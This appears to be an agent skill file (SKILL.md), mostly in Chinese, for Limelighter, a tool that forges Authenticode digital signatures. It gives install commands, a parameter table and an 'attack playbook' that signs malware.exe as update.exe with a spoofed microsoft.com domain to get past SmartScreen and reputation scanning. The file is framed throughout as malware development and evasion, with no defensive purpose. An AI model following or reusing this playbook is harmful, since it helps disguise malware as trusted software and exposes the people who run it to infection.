---
name: limelighter-forge
description: "Limelighter: Forge digital signatures to evade reputation scanning. Signals: malware development, evasion development, forged signatures, delay."
zh-signals: "Limelighter: 伪造数字签名过信誉查杀。信号:恶意软件开发,免杀开发,伪造签名,延时。"
---

# Limelighter

- 攻击大类:C45 恶意软件开发与免杀
- 上游仓库:https://github.com/Tylous/Limelighter
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Tylous/Limelighter && cd Limelighter && go build
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./Limelighter -I payload.exe -O signed.exe` | 伪造签名 |
| `-I bin -O out -Domain www.microsoft.com` | 域名 |
| `-Sleep 5` | 延时 |

## 攻击场景 Playbook

### 伪造数字签名过信誉查杀

```bash
./Limelighter -I malware.exe -O update.exe
# 可信签名绕过 SmartScreen
```

## 注意事项

Tylous 出品,伪造 Authenticode 签名。
